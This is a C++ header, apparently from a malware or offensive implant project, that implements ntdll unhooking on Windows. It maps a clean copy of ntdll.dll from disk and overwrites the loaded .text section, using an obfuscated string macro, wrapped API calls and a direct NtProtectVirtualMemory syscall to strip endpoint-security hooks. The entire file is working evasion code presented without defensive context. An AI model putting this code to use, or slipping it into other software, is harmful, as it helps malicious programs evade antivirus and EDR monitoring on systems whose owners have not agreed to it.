#pragma once
#include <windows.h>
#include "Internal.h"
#include "Syscalls.h"
#include "Obfuscation.h"
#include "../../DebugLog.h"
namespace NtdllUnhook {
    inline bool Execute() {
        SLOG("[UNHOOK] Starting ntdll unhooking...");
        auto ntdllStr = OBFS_S("ntdll.dll");
        HMODULE hNtdll = Internal::_GetModuleHandleA(ntdllStr.c_str());
        if (!hNtdll) {
            SLOG("[UNHOOK] GetModuleHandle(ntdll) FAILED");
            return false;
        }
        SLOG("[UNHOOK] Current ntdll at %p", hNtdll);
        auto ntdllPath = OBFS_S("C:\\Windows\\System32\\ntdll.dll");
        HANDLE hFile = Internal::_CreateFileA(
            ntdllPath.c_str(), GENERIC_READ, FILE_SHARE_READ,
            NULL, OPEN_EXISTING, 0, NULL);
        if (hFile == INVALID_HANDLE_VALUE) {
            SLOG("[UNHOOK] CreateFileA(ntdll.dll) FAILED");
            return false;
        }
        SLOG("[UNHOOK] File handle OK");
        HANDLE hMapping = Internal::_CreateFileMappingA(
            hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
        if (!hMapping) {
            SLOG("[UNHOOK] CreateFileMappingA FAILED");
            Internal::_CloseHandle(hFile);
            return false;
        }
        SLOG("[UNHOOK] Mapping handle OK");
        LPVOID pFreshNtdll = Internal::_MapViewOfFile(
            hMapping, FILE_MAP_READ, 0, 0, 0);
        if (!pFreshNtdll) {
            SLOG("[UNHOOK] MapViewOfFile FAILED");
            Internal::_CloseHandle(hMapping);
            Internal::_CloseHandle(hFile);
            return false;
        }
        SLOG("[UNHOOK] Fresh ntdll mapped at %p", pFreshNtdll);
        PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hNtdll;
        PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE*)hNtdll + pDos->e_lfanew);
        PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);
        bool textFound = false;
        for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
            if (pSection[i].Name[0] == '.' &&
                pSection[i].Name[1] == 't' &&
                pSection[i].Name[2] == 'e' &&
                pSection[i].Name[3] == 'x' &&
                pSection[i].Name[4] == 't') {
                LPVOID pCurrentText = (BYTE*)hNtdll + pSection[i].VirtualAddress;
                LPVOID pFreshText   = (BYTE*)pFreshNtdll + pSection[i].VirtualAddress;
                SIZE_T textSize     = pSection[i].Misc.VirtualSize;
                SLOG("[UNHOOK] .text: RVA=0x%X size=%zu current=%p fresh=%p",
                     pSection[i].VirtualAddress, textSize, pCurrentText, pFreshText);
                PVOID baseAddr = pCurrentText;
                SIZE_T regionSize = textSize;
                ULONG oldProtect = 0;
                NTSTATUS status = Syscalls::NtProtectVirtualMemory(
                    (HANDLE)-1, &baseAddr, &regionSize,
                    PAGE_EXECUTE_READWRITE, &oldProtect);
                if (status != 0) {
                    SLOG("[UNHOOK] Syscall NtProtect FAILED: 0x%X, trying VirtualProtect", status);
                    DWORD dwOld = 0;
                    if (!Internal::_VirtualProtect(pCurrentText, textSize,
                                                    PAGE_EXECUTE_READWRITE, &dwOld)) {
                        SLOG("[UNHOOK] VirtualProtect fallback also FAILED");
                        break;
                    }
                    oldProtect = dwOld;
                }
                SLOG("[UNHOOK] Protection changed to RWX (old=0x%X)", oldProtect);
                volatile BYTE* dst = (volatile BYTE*)pCurrentText;
                BYTE* src = (BYTE*)pFreshText;
                for (SIZE_T j = 0; j < textSize; j++) {
                    dst[j] = src[j];
                }
                SLOG("[UNHOOK] .text overwritten (%zu bytes)", textSize);
                baseAddr = pCurrentText;
                regionSize = textSize;
                ULONG tmpProtect = 0;
                Syscalls::NtProtectVirtualMemory(
                    (HANDLE)-1, &baseAddr, &regionSize,
                    oldProtect, &tmpProtect);
                SLOG("[UNHOOK] Protection restored to 0x%X", oldProtect);
                textFound = true;
                break;
            }
        }
        Internal::_UnmapViewOfFile(pFreshNtdll);
        Internal::_CloseHandle(hMapping);
        Internal::_CloseHandle(hFile);
        if (textFound) {
            SLOG("[UNHOOK] ntdll unhook completed SUCCESSFULLY");
        } else {
            SLOG("[UNHOOK] .text section NOT FOUND in ntdll");
        }
        return textFound;
    }
}
